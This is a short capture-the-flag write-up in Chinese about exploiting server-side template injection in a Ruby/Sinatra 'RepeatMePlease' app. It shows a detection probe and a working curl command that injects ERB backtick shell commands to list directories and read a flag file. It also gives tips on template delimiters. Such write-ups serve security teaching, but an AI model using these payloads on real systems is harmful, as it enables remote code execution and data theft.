## 题解

### 入口与指纹

Ruby/Sinatra，端口 4567，标题 `RepeatMePlease`。表单 POST `/generate`，字段
`sentence`（要重复的句子）和 `number`（次数）。

### 关键观察

`<%= 7*7 %>` → 输出 `49`，说明用的是 ERB 模板拼接。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST --data-urlencode "sentence=<%= \`cat /app/flag.txt\` %>" \
  -d 'number=1' "http://$T/generate" | grep -o 'flag{[^}]*}'
```

先用 `<%= \`ls /\` %>` 确认目录：flag 在 `/app/flag.txt`。

### flag 位置

容器内 `/app/flag.txt`。

## 复盘

- ERB 的定界符是 `<%= %>`，与 Jinja/Twig 的 `{{ }}` 不同；四种都试一次。
- 反引号比 `system()` 更适合把输出带回页面。
